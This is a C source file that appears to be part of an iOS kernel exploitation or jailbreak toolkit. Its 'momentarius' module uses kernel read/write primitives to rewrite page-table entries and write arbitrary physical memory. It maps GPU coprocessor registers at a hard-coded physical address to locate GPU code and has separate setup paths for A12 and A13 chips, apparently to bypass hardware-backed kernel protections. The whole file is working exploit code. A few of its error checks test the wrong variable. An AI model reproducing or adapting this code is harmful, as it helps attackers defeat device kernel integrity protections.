#include "utils.h"
#include "momentarius.h"

momentarius_t momentarius = {0};
volatile bool stop_write = false;

static int momentarius_pplwrite_buf(uint64_t pa, const void *data, size_t size) {
    if (pa == 0 || data == NULL || size == 0 || momentarius.target_rw_pte == 0) return -1;
    uint64_t target_page = trunc_page_kernel(pa);   
    uint64_t target_offset = pa - target_page;
    
    kwrite64(momentarius.target_rw_pte, (momentarius.orig_pte & 0xFFFF000000003FFFULL) | target_page);
    momentarius_tlb_flush();
    
    kwritebuf(momentarius.target_rw_mapping + target_offset, data, size);
    kwrite64(momentarius.target_rw_pte, momentarius.orig_pte);
    momentarius_tlb_flush();
    return 0;
}

static void momentarius_deinit(void) {
    if (KADDR_VALID(momentarius.target_rw_pte)) {
        kwrite64(momentarius.target_rw_pte, momentarius.orig_pte);
        momentarius_tlb_flush();
    }
    
    if (momentarius.gfx.shc_data != NULL) free(momentarius.gfx.shc_data);
    if (momentarius.gfx.ttbr1_load_data != NULL) free(momentarius.gfx.ttbr1_load_data);
    if (momentarius.gfx.hook_data != NULL) free(momentarius.gfx.hook_data);
    
    bzero(&momentarius, sizeof(momentarius_t));
    stop_write = false;
}

static int momentarius_init(void) {
    momentarius.self_proc_addr = proc_self();
    if (momentarius.self_proc_addr == 0) goto err;
    
    uint64_t kern_proc_addr = proc_find(0);
    if (kern_proc_addr == 0) goto err;
    uint64_t kern_task_addr = proc_task(kern_proc_addr);
    if (kern_proc_addr == 0) goto err;
    
    momentarius.kern_vm_map = kread_ptr(kern_task_addr + koffsetof(task, map));
    if (momentarius.kern_vm_map == 0) goto err;
    uint64_t kern_pmap = kread_ptr(momentarius.kern_vm_map + 0x40);
    if (momentarius.kern_vm_map == 0) goto err;
    
    momentarius.kern_tte = kread64(kern_pmap + 0x0);
    momentarius.kern_ttep = kread64(kern_pmap + 0x8);
    if (momentarius.kern_tte == 0 || momentarius.kern_ttep == 0) goto err;

    momentarius.kern_min_va = kread64(momentarius.kern_vm_map + 0x20);
    momentarius.kern_max_va = kread64(momentarius.kern_vm_map + 0x28);
    if (momentarius.kern_min_va == 0 || momentarius.kern_max_va == 0) goto err;
    
    uint64_t gfx_iorvbar = map_phys_data(0x206050000, 0x4000);
    if (gfx_iorvbar == 0) goto err;
    
    momentarius.gfx.text_pa = (*(volatile uint64_t *)gfx_iorvbar) & 0xFFFFFFFFE;
    if (momentarius.gfx.text_pa == 0) goto err;
    debug_log("text_pa: 0x%llx\n", momentarius.gfx.text_pa);

    mach_port_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOMobileFramebuffer"));
    if (MACH_PORT_VALID(service)) {
        IOServiceOpen(service, mach_task_self(), 0, &momentarius.iomfb_client);
    }
    
    cpu_subtype_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);
    int err = -1;
    
    switch(cpu_family) {
        case CPUFAMILY_ARM_VORTEX_TEMPEST: /* A12(X/Z) */ {
            momentarius.gfx.text_va = 0;
            err = momentarius_init_A12();
        } break;
            
        case CPUFAMILY_ARM_LIGHTNING_THUNDER: /* A13 */ {
            momentarius.gfx.text_va = 0xFFFFFF8000000000;
            err = momentarius_init_A13();
        } break;
        default: break;
    }
    if (err == 0) return 0;
    
err:
    momentarius_deinit();
    return -1;
}
